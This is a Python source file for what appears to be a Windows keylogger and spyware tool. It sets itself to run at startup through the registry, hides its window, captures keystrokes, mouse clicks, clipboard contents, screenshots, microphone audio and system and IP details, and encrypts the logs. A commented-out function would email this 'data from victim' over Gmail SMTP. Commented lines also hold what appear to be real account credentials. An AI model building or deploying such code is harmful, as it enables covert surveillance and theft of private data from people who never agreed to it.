import sys
import socket
import platform

import win32clipboard as clip

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import base64
import os
import pyWinhook
import pythoncom
import random
import smtplib
import string
import time
from winreg import OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, SetValueEx

global t, start_time, pics_names, yourGmail, yourGmailPass, sendto, interval

t = ""
pics_names = []
#
# yourGmail = "sravyablog2001@gmail.com"
# yourGmailPass = "kvsrasru20012007"
# sendto = "sravyablog2001@gmail.com"
interval = 60
file_path = "C:\\Users\\kvsra\\PycharmProjects\\keylogger\\Project"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

username = getpass.getuser()
key = "mxK-RhN_B2k0lLUHDf6e_6VVa_e06woC87REmkOVgBc="  # Generate an encryption key from the Cryptography folder

try:

    f = open('Logfile.txt', 'a')
    f.close()

except:

    f = open('Logfile.txt', 'w')
    f.close()


def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
               new_file_path)


def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


addStartup()

Hide()


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            clip.OpenClipboard()
            pasted_data = clip.GetClipboardData()
            clip.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


copy_clipboard()


# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


microphone()


def ScreenShot():
    global pics_names
    import pyautogui

    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                                     + string.digits) for _ in range(7))

    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


# def Mail_it(data, picsNames):
#     data = base64.b64encode(data)
#     data = 'New data from victim(Base64 encoded)\n' + data
#     server = smtplib.SMTP('smtp.gmail.com:587')
#     server.starttls()
#     server.login(yourGmail, yourGmailPass)
#     server.sendmail(yourGmail, sendto, data)
#     server.close()
#
#     for pic in picsNames:
#         data = base64.b64encode(open(pic, 'r+').read())
#         data = 'New pic data from victim(Base64 encoded)\n' + data
#         server = smtplib.SMTP('smtp.gmail.com:587')
#         server.starttls()
#         server.login(yourGmail, yourGmailPass)
#         server.sendmail(yourGmail, sendto,
#                         smtplib.msg.as_string())
#         server.close()


def OnMouseEvent(event):
    global yourGmail, yourGmailPass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
           + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time, pics_names

    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        # Mail_it(t, pics_names)
        start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global yourGmail, yourGmailPass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
           + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        # Mail_it(t, pics_names)
        t = ''

    return True


files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + 'Logfile.txt']
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                        file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    count += 1

hook = pyWinhook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
